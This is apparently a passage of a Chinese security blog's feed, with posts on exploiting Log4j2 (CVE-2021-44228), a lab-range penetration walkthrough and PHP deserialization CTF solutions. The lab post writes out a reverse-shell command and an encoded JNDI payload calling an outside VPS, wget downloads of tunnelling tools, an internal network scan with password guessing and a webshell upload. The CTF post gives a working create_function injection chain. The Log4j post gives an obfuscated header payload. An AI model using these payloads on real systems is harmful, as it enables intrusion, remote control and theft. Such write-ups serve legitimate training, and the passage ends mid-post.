class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="string">&quot;x.x.x.x&quot;</span> -p 6666</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131104816.png" alt="image-20211228131104816"></p><p>抓包修改<code>header</code>为攻击<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Api-Version: $&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;//139.196.234.164:1389/TomcatBypass/TomcatEcho&#125;</span><br><span class="line">cmd:ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228132305371.png" alt="image-20211228132305371"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>截止到目前，网上的修复方法大致是这些：</p><p>补丁链接: <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a></p><p>1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p><p>2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p><p>3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述:&quot;&gt;&lt;/a&gt;漏洞描述:&lt;/h2&gt;&lt;p&gt;Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。&lt;/p&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="log4j2" scheme="http://www.greetdawn.top/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>第三期cfs靶场</title>
    <link href="http://www.greetdawn.top/2021/12/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/"/>
    <id>http://www.greetdawn.top/2021/12/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/</id>
    <published>2021-12-07T03:12:47.000Z</published>
    <updated>2022-02-25T16:21:30.567Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="variable">$&#123;jndi:ldap://4o5zj6.dnslog.cn/cxvahp&#125;</span></span><br><span class="line">vps：139.196.234.164</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="Apache-log4j2漏洞-CVE-2021-44228"><a href="#Apache-log4j2漏洞-CVE-2021-44228" class="headerlink" title="Apache log4j2漏洞(CVE-2021-44228)"></a>Apache log4j2漏洞(CVE-2021-44228)</h1><p>10.134.110.23:8080</p><h2 id="flag1-flag-ee5645e88bd351505554be5016ef505e"><a href="#flag1-flag-ee5645e88bd351505554be5016ef505e" class="headerlink" title="flag1: flag{ee5645e88bd351505554be5016ef505e}"></a>flag1: flag{ee5645e88bd351505554be5016ef505e}</h2><p><strong>第一步：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://139.196.234.164:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</span><br></pre></td></tr></table></figure><p>注：后面command需要经过一次base64编码，两次URL编码处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command: bash -i &gt;&amp; /dev/tcp/139.196.234.164/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151433833.png"></p><p><strong>第二步：</strong></p><ul><li>vps监听</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><ul><li>开启恶意ldap服务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i &quot;139.196.234.164&quot; -p 8080</span><br></pre></td></tr></table></figure><p>成功上线</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216151543166.png" alt="image-20211216151543166"></p><p>10.134.110.23 内网探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@66f6d6f3234c:/tmp# ./fscan_amd64 -h 10.134.0.0/16</span><br><span class="line">./fscan_amd64 -h 10.134.0.0/16</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.6.3</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target &#x27;10.134.110.23&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;10.134.110.1&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;10.134.110.26&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;10.134.110.34&#x27; is alive</span><br><span class="line">icmp alive hosts len is: 4</span><br><span class="line">10.134.110.34:8093 open</span><br><span class="line">10.134.110.1:22 open</span><br><span class="line">10.134.110.34:8083 open</span><br><span class="line">10.134.110.34:8080 open</span><br><span class="line">10.134.110.26:8080 open</span><br><span class="line">10.134.110.1:8080 open</span><br><span class="line">10.134.110.23:8080 open</span><br><span class="line">10.134.110.34:8009 open</span><br><span class="line">10.134.110.26:8009 open</span><br><span class="line">alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http://10.134.110.34:8080 code:200 len:1507   title:Welcome to JBos                                                                                                                                                             s&amp;trade;</span><br><span class="line">[*] WebTitle:http://10.134.110.23:8080 code:404 len:0      title:None</span><br><span class="line">[*] WebTitle:http://10.134.110.1:8080  code:404 len:0      title:None</span><br><span class="line">[+] InfoScan:http://10.134.110.23:8080 [SprintBoot]</span><br><span class="line">[*] WebTitle:http://10.134.110.26:8080 code:200 len:20     title:Apache Tomcat/8                                                                                                                                                             .0.43</span><br><span class="line">[+] InfoScan:http://10.134.110.34:8080 [Jboss JBOSS]</span><br><span class="line">[*] WebTitle:http://10.134.110.34:8083 code:400 len:0      title:None</span><br><span class="line">[+] InfoScan:http://10.134.110.1:8080  [SprintBoot]</span><br><span class="line">[+] http://10.134.110.26:8080/manager/html tomcat tomcat</span><br><span class="line">[+] http://10.134.110.26:8080 poc-yaml-tomcat-manager-week</span><br><span class="line">已完成 8/9 [-] ssh 10.134.110.1:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 8/9 [-] ssh 10.134.110.1:22 admin admin123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 8/9 [-] ssh 10.134.110.1:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 9/9</span><br><span class="line">scan end</span><br></pre></td></tr></table></figure><p> 部署frp内网穿透工具</p><p>使用wget上传文件至外网机</p><p>wget <a href="http://139.196.234.164:8000/frpc">http://139.196.234.164:8000/frpc</a></p><p>wget <a href="http://139.196.234.164:8000/frpc.ini">http://139.196.234.164:8000/frpc.ini</a></p><p>frp连接</p><p>server:./frps -c frps.ini</p><p>client:./frpc -c frpc.ini</p><p>10.134.110.26:8080 存在toamcat弱口令部署war包</p><p>上传蚁剑马</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216164224261.png" alt="image-20211216164224261"></p><p>flag3： flag{a457f1dd3623a399d78a9672d225ddd5}</p><p>10.134.110.34:8080 JBOSS 命令执行</p><p>flag4：flag{4b0e8838ced75dbb359414892942d19d}</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216172919652.png" alt="image-20211216172919652"></p><p>172.78.69.16</p><p>172.78.69.15:8080 存在shire反序列化漏洞</p><p>flag2: flag{b2a0b3a262c1234132672229af281ed6}</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211216184338762.png" alt="image-20211216184338762"></p>]]></content>
    
    
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;payload=&lt;span class=&quot;variable&quot;&gt;$&amp;#123;jndi:ldap://4o5zj6.dnslog.cn/cxvahp&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vps：139.196.234.164&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/139.196.234.164/5555 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.greetdawn.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="cfs靶场" scheme="http://www.greetdawn.top/tags/cfs%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>php-unserialize-getflag</title>
    <link href="http://www.greetdawn.top/2021/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php-code-audit/php-unserialize-getflag/"/>
    <id>http://www.greetdawn.top/2021/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php-code-audit/php-unserialize-getflag/</id>
    <published>2021-12-06T09:18:53.000Z</published>
    <updated>2022-02-25T16:34:24.528Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg" alt="kitten-g9b6b71c7c_1920"></p><span id="more"></span><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$pwd</span>=getcwd();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">unserialize(<span class="keyword">$this</span>-&gt;key)();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;welcome &quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">              </span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="keyword">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><code>php</code>反序列化真要被<code>ctf</code>给玩烂了</p><p>这道题的代码不多，但是反正我是不会</p><p>逻辑思路是有，但是不会构造的，接下来就简单的分析一下吧</p><p>利用类<code>func</code>中的<code>__destruct()</code>魔法函数，调用触发类<code>GetFlag</code>中<code>get_flag</code>方法，根据<code>$a(&#39;&#39;, $this-&gt;code);</code>这行代码，可以构造<code>create_function</code>函数触发，逻辑都很简单。这里唯独就是不知道怎么给类<code>func</code>中的key构造传参</p><p>后面才知道可以这么传参：<code>$key = serialize([new GetFlag(), &quot;get_flag&quot;]);</code></p><h2 id="构造利用"><a href="#构造利用" class="headerlink" title="构造利用"></a>构造利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;        </span><br><span class="line">unserialize(<span class="keyword">$this</span>-&gt;key)();</span><br><span class="line"><span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;welcome &quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;        </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;;&#125;phpinfo();//&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$action</span> = <span class="string">&#x27;create_function&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">$this</span>-&gt;action;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> func();</span><br><span class="line"><span class="variable">$obj</span>-&gt;key = serialize([<span class="keyword">new</span> GetFlag(), <span class="string">&quot;get_flag&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>output：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/10279.php?0=O:4:%22func%22:3:&#123;s:4:%22mod1%22;N;s:4:%22mod2%22;N;s:3:%22key%22;s:116:%22a:2:&#123;i:0;O:7:%22GetFlag%22:2:&#123;s:4:%22code%22;s:14:%22;&#125;phpinfo();//%22;s:6:%22action%22;s:15:%22create_function%22;&#125;i:1;s:8:%22get_flag%22;&#125;%22;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211206173317019.png" alt="image-20211206173317019"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg&quot; alt=&quot;kitten-g9b6b71c7c_1920&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://www.greetdawn.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
    <category term="PHP反序列化" scheme="http://www.greetdawn.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化之魔法函数clone</title>
    <link href="http://www.greetdawn.top/2021/12/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php-code-audit/php-unserialize-clone/"/>
    <id>http://www.greetdawn.top/2021/12/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php-code-audit/php-unserialize-clone/</id>
    <published>2021-12-01T07:51:32.000Z</published>
    <updated>2022-02-25T16:34:18.019Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211201164317651.png" alt="image-20211201164317651"></p><span id="more"></span><h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><p>昨天某甲方客户联系我，直接甩了两道<code>php</code>反序列化的源码题，晚上回去把题目本地复现了一下。这个复现之路可谓艰辛。<code>phpstudy</code>直接报错，每一行都报错。后面才知道，因为直接以源码方式微信发的，我直接复制，导致复制的不干净，掺杂了一些脏东西。此处已心态爆炸，我把源码手撸了一遍。o(╯□╰)o幸好源码不是太多。第一题耽误了太多时间没搞出来，第二题出来了，这边想着做个简单记录吧。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>里面的注释内容为我本地运行时添加的测试代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">z</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//echo &quot;class z tostring&quot;;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a-&gt;b[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">h</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//echo &quot;class h&quot;;</span></span><br><span class="line"><span class="comment">//echo &quot;123&quot;.$method;</span></span><br><span class="line"><span class="comment">//echo &quot;456&quot;.$this-&gt;method;</span></span><br><span class="line">var_dump(<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;method))&#123;</span><br><span class="line"><span class="keyword">eval</span>(array_shift(<span class="variable">$arg</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;xixi=<span class="keyword">clone</span> <span class="keyword">$this</span>-&gt;z;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//echo &quot;__clone&quot;;</span></span><br><span class="line"><span class="comment">//var_dump($this-&gt;f);</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;f-&gt;haha(<span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>其实代码内容并不多</p><p>但是这里面的魔法函数<code>__clone</code>以及函数<code>clone</code>是我第一次见，这里真的说明自己有点菜，题做的太少啊~ 时间都用来打杂了，我一开始把它认为是自定义函数了。。。</p><p>没用过咋办呢， 查呗，<code>google</code>走起。 别问我为啥不百度，其实你们都懂得~</p><p>网上给了一个小栗子演示了一下这个魔法函数的作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//首先定义一个test一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testclass</span> </span>&#123;</span><br><span class="line"><span class="comment">//成员变量是$value1</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$value1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//随后new一个obj1</span></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> Testclass();</span><br><span class="line"><span class="comment">//复制成员变量的值为qqq</span></span><br><span class="line"><span class="variable">$obj1</span>-&gt;value1 = <span class="string">&quot;qqq&quot;</span>;</span><br><span class="line"><span class="comment">//我们使用赋值符号给左边obj2赋值obj1</span></span><br><span class="line"><span class="variable">$obj2</span> = <span class="variable">$obj1</span>;</span><br><span class="line"><span class="comment">//我们在这里把obj2的的value1复制为eee</span></span><br><span class="line"><span class="variable">$obj2</span>-&gt;value1 =<span class="string">&quot;eee&quot;</span>;     </span><br><span class="line"><span class="comment">//随后我们打印出两者的值</span></span><br><span class="line">var_dump(<span class="variable">$obj1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$obj2</span>);</span><br></pre></td></tr></table></figure><p><strong>output:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; &#125;</span><br><span class="line">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; &#125; </span><br></pre></td></tr></table></figure><p>我们发现这种情况下运行结果一致：</p><p> <strong>那是因为（借用<code>php</code>手册的话就是）：当对象被复制后，<code>PHP 5 </code>会对对象的所有属性执行一个浅复制（<code>shallow copy</code>）。所有的引用属性 仍然会是一个指向原来的变量的引用。</strong></p><p>其实在这里就是<code>obj1</code>给了<code>obj2</code>它的地址，就和引用一样，<code>obj2</code>指向了<code>obj1</code></p><p>接下来使用<code>clone</code>复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里讲上述代码中</span><br><span class="line">$obj2 = $obj1;  =》$obj2 = clone $obj1;</span><br></pre></td></tr></table></figure><p><strong>output:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">object(Testclass)#1 (1) &#123; [&quot;value1&quot;]=&gt; string(3) &quot;qqq&quot; &#125;</span><br><span class="line">object(Testclass)#2 (1) &#123; [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; &#125; </span><br></pre></td></tr></table></figure><p>其实这里的clone就是为了实现深拷贝的作用。</p><p><code>__clone</code>触发条件：<strong>当我们对一个类有clone操作的时候将会触发这个类里面的__clone方法</strong></p><p>注：<strong>clone只能用于对象克隆，对象复制。如果clone一个非对象变量将会报错no obj</strong></p><h2 id="具体开干"><a href="#具体开干" class="headerlink" 